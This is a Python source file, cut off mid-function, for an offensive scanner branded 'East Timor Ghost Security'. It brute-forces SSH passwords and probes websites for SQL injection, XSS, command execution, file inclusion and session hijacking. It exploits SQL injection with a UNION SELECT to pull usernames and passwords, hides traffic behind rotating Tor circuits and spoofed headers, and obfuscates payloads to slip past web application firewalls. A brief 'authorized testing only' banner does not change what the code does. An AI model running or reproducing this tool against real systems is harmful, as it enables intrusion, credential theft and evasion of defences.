import sys
import time
import paramiko
import requests
import re
import concurrent.futures
from colorama import Fore, Style, init
from urllib.parse import urlparse, quote_plus
from datetime import datetime
import traceback
from jinja2 import Template
import urllib3
import random
import base64
from cryptography.fernet import Fernet
import os
import socks
import socket
from ftplib import FTP, error_perm
import smtplib
import dns.resolver
import xml.etree.ElementTree as ET
import html

# Disable SSL/TLS warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# Enhanced User Agents List
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.48",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203"
]

# WAF Bypass Techniques
WAF_BYPASS_TECHNIQUES = [
    # SQLi Bypass
    lambda x: x.replace("SELECT", "SEL/*RANDOM*/ECT"),
    lambda x: x.replace("UNION", "UNI/*BY*/ON"),
    lambda x: x.replace("OR", "O%52"),  # URL-encoded
    lambda x: x.replace("AND", "AN/*WA*/D"),
    lambda x: x.replace(" ", "/**/"),
    lambda x: x.replace(" ", "%0A"),  # Newline
    lambda x: x.replace(" ", "%09"),  # Tab
    lambda x: x.replace("'", "%EF%BC%87"),  # Unicode apostrophe
    lambda x: x.replace("\"", "%EF%BC%82"),  # Unicode quote
    lambda x: x.replace("=", "%3D"),
    lambda x: x.replace("(", "%28"),
    lambda x: x.replace(")", "%29"),
    lambda x: x.replace("--", "-%2D%2D"),
    
    # XSS Bypass
    lambda x: x.replace("<script>", "<scr%00ipt>"),
    lambda x: x.replace("alert", "al%65rt"),
    lambda x: x.replace("onerror", "onerr%6Fr"),
    lambda x: x.replace("img", "i%6Dg"),
    
    # General Obfuscation
    lambda x: base64.b64encode(x.encode()).decode(),
    lambda x: x.encode().hex(),
    lambda x: ''.join([f'%{ord(c):02x}' for c in x]),  # Full URL encoding
    lambda x: html.escape(x),
    lambda x: ''.join([c if random.random() > 0.5 else f'%{ord(c):02x}' for c in x]),
    lambda x: x + '/*' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) + '*/'
]

# Configuration
MAX_THREADS = 10
REQUEST_TIMEOUT = 15
RATE_LIMIT = 3
TOR_SOCKS_PORT = 9050
TOR_CONTROL_PORT = 9051
LOG_FILES = ["scan_log.txt", "cve_log.txt", "report.html"]
WAF_CHECK_HEADERS = {
    "X-Originating-IP": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Remote-Addr": "127.0.0.1"
}

# Encryption Key
ENCRYPTION_KEY = Fernet.generate_key()

# --- Animation Functions ---
def battery_animation(message="Connecting", duration=3):
    """Show battery charging animation"""
    battery_levels = ["[▯▯▯▯▯]", "[▮▯▯▯▯]", "[▮▮▯▯▯]", "[▮▮▮▯▯]", "[▮▮▮▮▯]", "[▮▮▮▮▮]"]
    colors = [Fore.RED, Fore.YELLOW, Fore.YELLOW, Fore.GREEN, Fore.GREEN, Fore.GREEN]
    
    start_time = time.time()
    while time.time() - start_time < duration:
        for i, (level, color) in enumerate(zip(battery_levels, colors)):
            sys.stdout.write(f"\r{Fore.CYAN}{message}{Style.RESET_ALL} {color}{level}{Style.RESET_ALL}")
            sys.stdout.flush()
            time.sleep(0.2)
    sys.stdout.write("\r" + " " * (len(message) + 10) + "\r")

def typewriter_effect(text, color=Fore.WHITE, delay=0.05):
    """Print text with typewriter effect"""
    for char in text:
        sys.stdout.write(color + char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def loading_animation(message="Loading"):
    """Show loading animation"""
    chars = "⣾⣽⣻⢿⡿⣟⣯⣷"
    for _ in range(20):
        for char in chars:
            sys.stdout.write(Fore.YELLOW + f"\r{message} {char}")
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write("\r" + " " * (len(message) + 2) + "\r")

# --- Banner Function ---
def show_banner():
    """Display the animated banner with typewriter effect and colors"""
    # Parts of the banner with color codes
    banner_data = [
        {'text': "▓█████ ▄▄▄        ██████ ▄▄▄█████▓   ▄▄▄█████▓ ██▓ ███▄ ▄███▓ ▒█████   ██▀███       ▄████  ██░ ██  ▒█████    ██████ ▄▄▄█████▓  ██████ ▓█████  ▄████▄\n", 'color': Fore.YELLOW},  
        {'text': "▓█   ▀▒████▄    ▒██    ▒ ▓  ██▒ ▓▒   ▓  ██▒ ▓▒▓██▒▓██▒▀█▀ ██▒▒██▒  ██▒▓██ ▒ ██▒    ██▒ ▀█▒▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█\n", 'color': Fore.YELLOW},  
        {'text': "▒███  ▒██  ▀█▄  ░ ▓██▄   ▒ ▓██░ ▒░   ▒ ▓██░ ▒░▒██▒▓██    ▓██░▒██░  ██▒▓██ ░▄█ ▒   ▒██░▄▄▄░▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░░ ▓██▄   ▒███   ▒▓█    ▄\n", 'color': Fore.YELLOW}, 
        {'text': "▒▓█  ▄░██▄▄▄▄██   ▒   ██▒░ ▓██▓ ░    ░ ▓██▓ ░ ░██░▒██    ▒██ ▒██   ██░▒██▀▀█▄     ░▓█  ██▓░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░   ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒\n", 'color': Fore.RED},
        {'text': "░▒████▒▓█   ▓██▒▒██████▒▒  ▒██▒ ░      ▒██▒ ░ ░██░▒██▒   ░██▒░ ████▓▒░░██▓ ▒██▒   ░▒▓███▀▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░ ▒██████▒▒░▒████▒▒ ▓███▀ ░\n", 'color': Fore.RED},
        {'text': "░░ ▒░ ░▒▒   ▓▒█░▒ ▒▓▒ ▒ ░  ▒ ░░        ▒ ░░   ░▓  ░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░    ░▒   ▒  ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░   ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░\n", 'color': Fore.WHITE},
        {'text': " ░ ░  ░ ▒   ▒▒ ░░ ░▒  ░ ░    ░           ░     ▒ ░░  ░      ░  ░ ▒ ▒░   ░▒ ░ ▒░     ░   ░  ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░    ░ ░▒  ░ ░ ░ ░  ░  ░  ▒ \n", 'color': Fore.WHITE},  
        {'text': "   ░    ░   ▒   ░  ░  ░    ░           ░       ▒ ░░      ░   ░ ░ ░ ▒    ░░   ░    ░ ░   ░  ░  ░░ ░░ ░ ░ ▒  ░  ░  ░    ░      ░  ░  ░     ░   ░\n", 'color': Fore.WHITE},       
        {'text': " ░  ░     ░  ░      ░                        ░         ░       ░ ░     ░              ░  ░  ░  ░    ░ ░        ░                 ░     ░  ░░ ░\n", 'color': Fore.WHITE},      
        {'text': "                                                                                                                                    ░\n", 'color': Fore.WHITE},
        {'text': "╔══════════════════════════════════════════════════╗\n", 'color': Fore.CYAN},
        {'text': "║", 'color': Fore.CYAN},
        {'text': "      BUG HUNTING & VULNERABILITY SCANNER         ", 'color': Fore.MAGENTA},
        {'text': "║\n", 'color': Fore.CYAN},
        {'text': "║", 'color': Fore.CYAN},
        {'text': "             EAST TIMOR GHOST SECURITY            ", 'color': Fore.MAGENTA},
        {'text': "║\n", 'color': Fore.CYAN},
        {'text': "║", 'color': Fore.CYAN},
        {'text': "                 Version: 1.3                     ", 'color': Fore.MAGENTA},
        {'text': "║\n", 'color': Fore.CYAN},
        {'text': "╚══════════════════════════════════════════════════╝\n", 'color': Fore.CYAN},
        {'text': "╔══════════════════════════════════════════════════╗\n", 'color': Fore.GREEN},
        {'text': "║", 'color': Fore.GREEN},
        {'text': "  WARNING: For authorized penetration testing     ", 'color': Fore.YELLOW},
        {'text': "║\n", 'color': Fore.GREEN},
        {'text': "║", 'color': Fore.GREEN},
        {'text': "        only. Use at your own risk!               ", 'color': Fore.YELLOW},
        {'text': "║\n", 'color': Fore.GREEN},
        {'text': "╚══════════════════════════════════════════════════╝\n", 'color': Fore.GREEN}
    ]

    for part in banner_data:
        for char in part['text']:
            sys.stdout.write(part['color'] + char)
            sys.stdout.flush()
            time.sleep(0.002 if char not in ['\n', ' '] else 0.0005)
        time.sleep(0.02)
    
    # Reset color at the end
    sys.stdout.write(Style.RESET_ALL)
    sys.stdout.flush()
    
# --- Utility Functions ---
def read_payloads_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            payloads = [line.strip() for line in file if line.strip()]
        return payloads
    except FileNotFoundError:
        print(Fore.RED + f"File {file_path} not found.")
        return []

def encrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as file:
            data = file.read()
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        with open(file_path, "wb") as file:
            file.write(encrypted)
    except Exception as e:
        print(Fore.RED + f"Error encrypting file: {e}")

def save_to_log(scan_type, target, payload, result, response=None):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] Scan Type: {scan_type}\nTarget: {target}\nPayload: {payload}\nResult: {result}\n"
    if response:
        log_entry += f"Response Code: {response.status_code}\n"
        log_entry += f"Response Headers: {dict(response.headers)}\n"
        log_entry += f"Response Body (first 500 chars): {response.text[:500]}\n\n"
    with open("scan_log.txt", "a") as log_file:
        log_file.write(log_entry)

def save_cve_log(scan_type, target, payload, extracted_data):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cve_entry = f"[{timestamp}] Scan Type: {scan_type}\nTarget: {target}\nPayload: {payload}\nExtracted Data:\n{extracted_data}\n\n"
    with open("cve_log.txt", "a") as cve_file:
        cve_file.write(cve_entry)

def generate_html_report(scan_type, target, payload, result):
    template = Template("""
    <html>
    <head>
        <title>Scan Report - {{ scan_type }}</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background-color: #f4f4f9; color: #333; }
            h1 { color: #4CAF50; text-align: center; }
            .report-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); max-width: 800px; margin: auto; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
            th { background-color: #4CAF50; color: white; }
            tr:hover { background-color: #f5f5f5; }
            .vulnerable { color: #d32f2f; font-weight: bold; }
            .not-vulnerable { color: #388e3c; font-weight: bold; }
            .timestamp { font-size: 0.9em; color: #666; text-align: right; margin-bottom: 20px; }
            .waf-warning { color: #FF9800; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="report-container">
            <h1>Scan Report - {{ scan_type }}</h1>
            <div class="timestamp">Report generated on: {{ timestamp }}</div>
            {% if waf_detected %}
            <div class="waf-warning">⚠️ WAF Detected - Payloads were obfuscated</div>
            {% endif %}
            <table>
                <tr><th>Field</th><th>Details</th></tr>
                <tr><td>Scan Type</td><td>{{ scan_type }}</td></tr>
                <tr><td>Target</td><td>{{ target }}</td></tr>
                <tr><td>Payload</td><td><pre>{{ payload }}</pre></td></tr>
                <tr><td>Result</td><td class="{% if 'Vulnerable' in result %}vulnerable{% else %}not-vulnerable{% endif %}">{{ result }}</td></tr>
            </table>
        </div>
    </body>
    </html>
    """)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    html_report = template.render(
        scan_type=scan_type,
        target=target,
        payload=payload,
        result=result,
        timestamp=timestamp,
        waf_detected=hasattr(sys, 'waf_detected') and sys.waf_detected
    )
    with open("report.html", "w") as file:
        file.write(html_report)

def validate_url(url):
    parsed = urlparse(url)
    return parsed.scheme in ("http", "https") and parsed.netloc

def print_info(message, color=Fore.CYAN):
    print(f"[{color}INFO{Style.RESET_ALL}] {message}")

def print_results(results):
    for payload, result in results:
        print_info(f"Payload  : {payload}")
        print_info(f"Status   : {result}", Fore.YELLOW if "Vulnerable" in result else Fore.RED)
    print("-" * 50)

# --- Tor Functions ---
def verify_tor_connection():
    try:
        battery_animation("Verifying Tor connection", 2)
        session = requests.session()
        session.proxies = {
            'http': f'socks5h://127.0.0.1:{TOR_SOCKS_PORT}',
            'https': f'socks5h://127.0.0.1:{TOR_SOCKS_PORT}'
        }
        response = session.get("https://check.torproject.org/", timeout=10)
        return "Congratulations. This browser is configured to use Tor." in response.text
    except Exception:
        return False

def rotate_tor_circuit():
    try:
        battery_animation("Rotating Tor circuit", 1)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('127.0.0.1', TOR_CONTROL_PORT))
            s.sendall(b'AUTHENTICATE ""\r\n')
            response = s.recv(1024)
            if b'250' not in response:
                return False
            s.sendall(b'SIGNAL NEWNYM\r\n')
            response = s.recv(1024)
            return b'250' in response
    except Exception:
        return False

def set_tor_proxy():
    battery_animation("Initializing Tor proxy", 3)
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", TOR_SOCKS_PORT)
    socket.socket = socks.socksocket
    if verify_tor_connection():
        print(Fore.GREEN + "[INFO] Tor proxy is working correctly!")
        return True
    else:
        print(Fore.RED + "[ERROR] Tor proxy verification failed.")
        return False

# --- WAF Bypass Functions ---
def bypass_waf(payload, scan_type=None):
    """Advanced WAF bypass with scan-type specific techniques"""
    if not payload:
        return payload
        
    # Apply random bypass techniques (2-4 techniques per payload)
    techniques_to_apply = random.sample(WAF_BYPASS_TECHNIQUES, k=random.randint(2,4))
    for technique in techniques_to_apply:
        try:
            payload = technique(payload)
        except:
            continue
    
    # Scan-type specific transformations
    if scan_type == "SQL":
        payload = payload.replace("1=1", "2-1=1")
        payload = payload.replace("'", "/*!*/'")
    elif scan_type == "XSS":
        payload = payload.replace("<", "%3C").replace(">", "%3E")
    elif scan_type == "RCE":
        payload = payload.replace(";", "%3B").replace("|", "%7C")
    
    return payload

def check_waf_protection(url):
    """Detect if target has WAF protection"""
    battery_animation("Checking WAF protection", 2)
    test_payloads = [
        "../../../etc/passwd",
        "<script>alert(1)</script>",
        "' OR 1=1--",
        "|cat /etc/passwd"
    ]
    
    for payload in test_payloads:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                **WAF_CHECK_HEADERS
            }
            test_url = f"{url}?test={quote_plus(payload)}"
            response = requests.get(test_url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
            
            if response.status_code in [403, 406, 419, 503]:
                return True
            if any(waf_indicator in response.text.lower() for waf_indicator in ["cloudflare", "akamai", "imperva", "waf", "blocked"]):
                return True
            if "Request rejected" in response.text:
                return True
        except:
            continue
    
    return False

# --- Stealth & Evasion ---
def stealth_delay():
    time.sleep(random.uniform(1, 5))

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def obfuscate_payload(payload, scan_type=None):
    if not payload:
        return payload
    
    # First apply WAF bypass
    payload = bypass_waf(payload, scan_type)
    
    # Then apply additional obfuscation
    method = random.randint(1, 4)
    if method == 1:
        return base64.b64encode(payload.encode()).decode()
    elif method == 2:
        return payload.encode().hex()
    elif method == 3:
        return quote_plus(payload)
    else:
        return payload

def make_stealthy_request(url, method="GET", params=None, data=None, headers=None, scan_type=None):
    try:
        stealth_delay()
        
        # Initialize session with Tor if available
        session = requests.session()
        if hasattr(sys, 'using_tor') and sys.using_tor:
            session.proxies = {
                'http': f'socks5h://127.0.0.1:{TOR_SOCKS_PORT}',
                'https': f'socks5h://127.0.0.1:{TOR_SOCKS_PORT}'
            }
        
        # Prepare headers
        if headers is None:
            headers = {
                "User-Agent": get_random_user_agent(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0"
            }
        
        # Add random headers
        extra_headers = {
            "DNT": str(random.randint(0, 1)),
            "Referer": random.choice([
                "https://www.google.com/",
                "https://www.bing.com/",
                "https://twitter.com/",
                "https://facebook.com/"
            ]),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Requested-With": "XMLHttpRequest" if random.random() > 0.5 else "",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1"
        }
        headers.update(extra_headers)
        
        # Obfuscate parameters if needed
        if params:
            params = {k: obfuscate_payload(v, scan_type) for k, v in params.items()}
        if data:
            if isinstance(data, dict):
                data = {k: obfuscate_payload(v, scan_type) for k, v in data.items()}
            else:
                data = obfuscate_payload(data, scan_type)
        
        time.sleep(random.uniform(0.5, 2.5))
        
        # Make the request
        if method.upper() == "GET":
            response = session.get(
                url,
                params=params,
                headers=headers,
                timeout=REQUEST_TIMEOUT,
                verify=False,
                allow_redirects=False
            )
        else:
            response = session.post(
                url,
                data=data,
                headers=headers,
                timeout=REQUEST_TIMEOUT,
                verify=False,
                allow_redirects=False
            )
        
        # Randomly rotate Tor circuit
        if random.random() > 0.7 and hasattr(sys, 'using_tor') and sys.using_tor:
            rotate_tor_circuit()
            
        return response
    except Exception as e:
        print(Fore.RED + f"[ERROR] Request failed: {str(e)[:200]}")
        return None

# --- Vulnerability Scanners ---
def ssh_scan(host, port, payloads):
    battery_animation(f"Scanning SSH {host}:{port}", 1)
    results = []
    for payload in payloads:
        try:
            username, password = payload.split(":")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Obfuscate credentials
            username = bypass_waf(username, "SSH")
            password = bypass_waf(password, "SSH")
            
            ssh.connect(
                host,
                port=int(port),
                username=username,
                password=password,
                timeout=REQUEST_TIMEOUT,
                banner_timeout=200,
                auth_timeout=200
            )
            
            result = (payload, f"{Fore.GREEN}Vulnerable{Style.RESET_ALL}")
            ssh.close()
            exploit_result = f"SSH login successful with {username}:{password}"
            save_cve_log("SSH", f"{host}:{port}", payload, exploit_result)
        except Exception as e:
            result = (payload, f"{Fore.RED}Not Vulnerable: {str(e)[:100]}{Style.RESET_ALL}")
        
        results.append(result)
        save_to_log("SSH", f"{host}:{port}", payload, result[1], None)
        generate_html_report("SSH", f"{host}:{port}", payload, result[1])
    print_results(results)

def sql_injection(url, payloads):
    battery_animation(f"Scanning SQLi {url}", 1)
    results = []
    waf_detected = check_waf_protection(url)
    if waf_detected:
        print(Fore.YELLOW + "[WARNING] WAF detected - Applying advanced bypass techniques")
        sys.waf_detected = True
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(send_sql_payload, url, payload, waf_detected) for payload in payloads]
        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
                results.append(result)
                if "Vulnerable" in result[1]:
                    exploit_result = exploit_sql_injection(url, result[0], waf_detected)
                    if exploit_result:
                        save_cve_log("SQL Injection", url, result[0], exploit_result)
            except Exception as e:
                print(Fore.RED + f"Error: {e}")
    print_results(results)

def send_sql_payload(url, payload, waf_detected=False):
    try:
        obfuscated_payload = obfuscate_payload(payload, "SQL") if waf_detected else payload
        response = make_stealthy_request(url, params={"id": obfuscated_payload}, scan_type="SQL")
        
        if response is None:
            return (payload, f"{Fore.RED}Error: Request failed{Style.RESET_ALL}")
        
        # Error-Based Detection
        error_keywords = [
            "error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark",
            "sqlserver exception",
            "syntax error",
            "unterminated quoted string",
            "postgresql query failed"
        ]
        
        error_detected = any(re.search(keyword, response.text, re.IGNORECASE) for keyword in error_keywords)
        
        if error_detected:
            return (payload, f"{Fore.GREEN}Vulnerable (Error-Based){Style.RESET_ALL}")
        
        # Time-Based Detection
        start_time = time.time()
        time_payload = obfuscate_payload(f"{payload} AND SLEEP(5)--", "SQL") if waf_detected else f"{payload} AND SLEEP(5)--"
        make_stealthy_request(url, params={"id": time_payload}, scan_type="SQL")
        elapsed_time = time.time() - start_time
        
        if elapsed_time > 5:
            return (payload, f"{Fore.GREEN}Vulnerable (Time-Based){Style.RESET_ALL}")
        
        # Boolean-Based Detection
        true_response = make_stealthy_request(url, params={"id": obfuscate_payload(f"{payload} AND 1=1--", "SQL")}, scan_type="SQL")
        false_response = make_stealthy_request(url, params={"id": obfuscate_payload(f"{payload} AND 1=2--", "SQL")}, scan_type="SQL")
        
        if true_response and false_response and true_response.text != false_response.text:
            return (payload, f"{Fore.GREEN}Vulnerable (Boolean-Based){Style.RESET_ALL}")
        
        return (payload, f"{Fore.RED}Not Vulnerable{Style.RESET_ALL}")
    except Exception as e:
        return (payload, f"{Fore.RED}Error: {e}")

def exploit_sql_injection(url, payload, waf_detected=False):
    try:
        exploit_payload = obfuscate_payload(f"{payload} UNION SELECT username, password FROM users--", "SQL") if waf_detected else f"{payload} UNION SELECT username, password FROM users--"
        response = make_stealthy_request(url, params={"id": exploit_payload}, scan_type="SQL")
        
        if response and ("username" in response.text.lower() or "password" in response.text.lower()):
            # Extract potential credentials
            cred_patterns = [
                r"(?i)username['\"]?\s*[:=]\s*['\"]([^'\"]+)",
                r"(?i)password['\"]?\s*[:=]\s*['\"]([^'\"]+)",
                r"(?i)<td>([^<]+)</td>\s*<td>([^<]+)</td>"
            ]
            
            extracted_data = []
            for pattern in cred_patterns:
                matches = re.finditer(pattern, response.text)
                for match in matches:
                    if len(match.groups()) >= 1:
                        extracted_data.append(f"{match.group(1)}:{match.group(2) if len(match.groups()) > 1 else 'N/A'}")
            
            return "\n".join(extracted_data) if extracted_data else response.text[:500]
        return None
    except Exception as e:
        return f"Exploit failed: {e}"

def xss_scan(url, payloads):
    battery_animation(f"Scanning XSS {url}", 1)
    results = []
    waf_detected = check_waf_protection(url)
    if waf_detected:
        print(Fore.YELLOW + "[WARNING] WAF detected - Applying advanced bypass techniques")
        sys.waf_detected = True
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(send_xss_payload, url, payload, waf_detected) for payload in payloads]
        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
                results.append(result)
                if "Vulnerable" in result[1]:
                    exploit_result = f"XSS payload executed: {result[0]}"
                    save_cve_log("XSS", url, result[0], exploit_result)
            except Exception as e:
                print(Fore.RED + f"Error: {e}")
    print_results(results)

def send_xss_payload(url, payload, waf_detected=False):
    try:
        obfuscated_payload = obfuscate_payload(payload, "XSS") if waf_detected else payload
        data = {"input": obfuscated_payload}
        response = make_stealthy_request(url, method="POST", data=data, scan_type="XSS")
        
        if response is None:
            return (payload, f"{Fore.RED}Error: Request failed{Style.RESET_ALL}")
        
        # Check for reflected XSS
        if obfuscated_payload in response.text:
            return (payload, f"{Fore.GREEN}Vulnerable (Reflected){Style.RESET_ALL}")
        
        # Check for DOM XSS indicators
        dom_patterns = [
            r"<script>[^<]*" + re.escape(obfuscated_payload),
            r"eval\([^)]*" + re.escape(obfuscated_payload),
            r"document\.write\([^)]*" + re.escape(obfuscated_payload)
        ]
        
        if any(re.search(pattern, response.text) for pattern in dom_patterns):
            return (payload, f"{Fore.GREEN}Vulnerable (DOM-Based){Style.RESET_ALL}")
        
        return (payload, f"{Fore.RED}Not Vulnerable{Style.RESET_ALL}")
    except Exception as e:
        return (payload, f"{Fore.RED}Error: {e}")

def csrf_scan(url, payloads):
    battery_animation(f"Scanning CSRF {url}", 1)
    results = []
    waf_detected = check_waf_protection(url)
    if waf_detected:
        print(Fore.YELLOW + "[WARNING] WAF detected - Applying advanced bypass techniques")
        sys.waf_detected = True
    
    for payload in payloads:
        try:
            obfuscated_payload = obfuscate_payload(payload, "CSRF") if waf_detected else payload
            response = make_stealthy_request(url, method="POST", data={"csrf_token": obfuscated_payload}, scan_type="CSRF")
            
            if response and response.status_code == 200:
                result = (payload, f"{Fore.GREEN}Potential CSRF (No Token Validation){Style.RESET_ALL}")
            else:
                result = (payload, f"{Fore.RED}Not Vulnerable (Token Validated){Style.RESET_ALL}")
        except Exception as e:
            result = (payload, f"{Fore.RED}Error: {e}")
        
        results.append(result)
        save_to_log("CSRF", url, payload, result[1], response)
        generate_html_report("CSRF", url, payload, result[1])
    print_results(results)

def rce_scan(url, payloads):
    battery_animation(f"Scanning RCE {url}", 1)
    results = []
    waf_detected = check_waf_protection(url)
    if waf_detected:
        print(Fore.YELLOW + "[WARNING] WAF detected - Applying advanced bypass techniques")
        sys.waf_detected = True
    
    for payload in payloads:
        try:
            obfuscated_payload = obfuscate_payload(payload, "RCE") if waf_detected else payload
            response = make_stealthy_request(url, params={"cmd": obfuscated_payload}, scan_type="RCE")
            
            if response and ("root:" in response.text or "www-data" in response.text or "Command executed" in response.text):
                result = (payload, f"{Fore.GREEN}Vulnerable{Style.RESET_ALL}")
            else:
                result = (payload, f"{Fore.RED}Not Vulnerable{Style.RESET_ALL}")
        except Exception as e:
            result = (payload, f"{Fore.RED}Error: {e}")
        
        results.append(result)
        save_to_log("RCE", url, payload, result[1], response)
        generate_html_report("RCE", url, payload, result[1])
    print_results(results)

def lfi_scan(url, payloads):
    battery_animation(f"Scanning LFI {url}", 1)
    results = []
    waf_detected = check_waf_protection(url)
    if waf_detected:
        print(Fore.YELLOW + "[WARNING] WAF detected - Applying advanced bypass techniques")
        sys.waf_detected = True
    
    for payload in payloads:
        try:
            obfuscated_payload = obfuscate_payload(payload, "LFI") if waf_detected else payload
            response = make_stealthy_request(url, params={"file": obfuscated_payload}, scan_type="LFI")
            
            if response and ("root:" in response.text or "etc/passwd" in response.text or "bin/bash" in response.text):
                result = (payload, f"{Fore.GREEN}Vulnerable{Style.RESET_ALL}")
            else:
                result = (payload, f"{Fore.RED}Not Vulnerable{Style.RESET_ALL}")
        except Exception as e:
            result = (payload, f"{Fore.RED}Error: {e}")
        
        results.append(result)
        save_to_log("LFI", url, payload, result[1], response)
        generate_html_report("LFI", url, payload, result[1])
    print_results(results)

def directory_traversal_scan(url, payloads):
    battery_animation(f"Scanning Directory Traversal {url}", 1)
    results = []
    waf_detected = check_waf_protection(url)
    if waf_detected:
        print(Fore.YELLOW + "[WARNING] WAF detected - Applying advanced bypass techniques")
        sys.waf_detected = True
    
    for payload in payloads:
        try:
            obfuscated_payload = obfuscate_payload(payload, "DIR") if waf_detected else payload
            response = make_stealthy_request(url, params={"path": obfuscated_payload}, scan_type="DIR")
            
            if response and response.status_code == 200 and ("index of" in response.text.lower() or "directory listing" in response.text.lower()):
                result = (payload, f"{Fore.GREEN}Vulnerable{Style.RESET_ALL}")
            else:
                result = (payload, f"{Fore.RED}Not Vulnerable{Style.RESET_ALL}")
        except Exception as e:
            result = (payload, f"{Fore.RED}Error: {e}")
        
        results.append(result)
        save_to_log("Directory Traversal", url, payload, result[1], response)
        generate_html_report("Directory Traversal", url, payload, result[1])
    print_results(results)

def session_hijacking_scan(url, payloads):
    battery_animation(f"Scanning Session Hijacking {url}", 1)
    results = []
    waf_detected = check_waf_protection(url)
    if waf_detected:
        print(Fore.YELLOW + "[WARNING] WAF detected - Applying advanced bypass techniques")
        sys.waf_detected = True
    
    for payload in payloads:
        try:
            obfuscated_payload = obfuscate_payload(payload, "SESSION") if waf_detected else payload
            response = make_stealthy_request(url, headers={"Cookie": f"session_id={obfuscated_payload}"}, scan_type="SESSION")
            
            if response and ("admin" in response.text.lower() or "welcome" in response.text.lower() or "dashboard" in response.text.lower()):
                result = (payload, f"{Fore.GREEN}Vulnerable (Session Hijacked){Style.RESET_ALL}")
            else:
                result = (payload, f"{Fore.RED}Not Vulnerable{Style.RESET_ALL}")
        except Exception as e:
            result = (payload, f"{Fore.RED}Error: {e}")
        
        results.append(result)
        save_to_log("Session Hijacking", url, payload, result[1], response)
        generate_html_report("Session Hijacking", url, payload, result[1])
    print_results(results)

def insecure_data_storage_scan(url, payloads):
    battery_animation(f"Scanning Insecure Data Storage {url}", 1)
    results = []
    waf_detected = check_waf_protection(url)
    if waf_detected:
        print(Fore.YELLOW + "[WARNING] WAF detected - Applying advanced bypass techniques")
        sys.waf_detected = True
    
    for payload in payloads:
        try:
            obfuscated_payload = obfuscate_payload(payload, "DATA") if waf_detected else payload
            response = make_stealthy_request(url, params={"data": obfuscated_payload}, scan_type="DATA")
            
            if response and obfuscated_payload in response.text:
